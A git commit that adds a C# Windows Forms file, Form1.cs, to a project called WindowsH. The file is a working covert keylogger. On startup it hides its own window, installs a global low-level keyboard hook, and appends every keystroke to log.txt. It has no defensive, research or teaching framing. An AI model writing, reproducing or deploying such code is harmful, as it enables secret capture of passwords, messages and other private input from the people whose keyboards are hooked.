3177d5751b9f93fb1e13eb960c29756f2907f9e2
Roman <amorka89@gmail.com>
2016-10-13 19:56:27 +0300

    j

---
+++ WindowsH/WindowsH/Form1.cs
@@ -0,0 +1,111 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+namespace WindowsH
+{
+    public partial class Form1 : Form
+    {
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(String sClassName, String sAppName);
+
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        public const int SW_HIDE = 0,
+                         SW_MAXIMIZE = 3,
+                         SW_MINIMIZE = 6,
+                         SW_RESTORE = 9,
+                         SW_SHOW = 5,
+                         SW_SHOWDEFAULT = 10,
+                         SW_SHOWMAXIMIZED = 3,
+                         SW_SHOWMINIMIZED = 2,
+                         SW_SHOWMINNOACTIVE = 7,
+                         SW_SHOWNA = 8,
+                         SW_SHOWNOACTIVATE = 4,
+                         SW_SHOWNORMAL = 1;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.Shown += Form1_Shown;
+            this.FormClosing += Form1_FormClosing;
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            try
+            {
+                UnhookWindowsHookEx(_hookID);
+            }
+            catch (Exception ex) { }
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {
+            ShowWindow(FindWindow(null, this.Text), SW_HIDE);
+            _hookID = SetHook(_proc);
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(
+            int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(
+            int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                StreamWriter sw = File.AppendText("log.txt");
+                //sw.Write(String.Format("{0}-{1}-{2} {3}:{4}:{5} - {6}",DateTime.Now.Year.ToString(), DateTime.Now.Month.ToString(),DateTime.Now.Day.ToString(), DateTime.Now.Hour.ToString(), DateTime.Now.Minute.ToString(), DateTime.Now.Second.ToString(), (Keys)vkCode));
+                sw.Write(((Keys)vkCode).ToString().Replace("Capital","CapsLock") +",");
+                sw.Flush();
+                sw.Dispose();
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+    }
+}
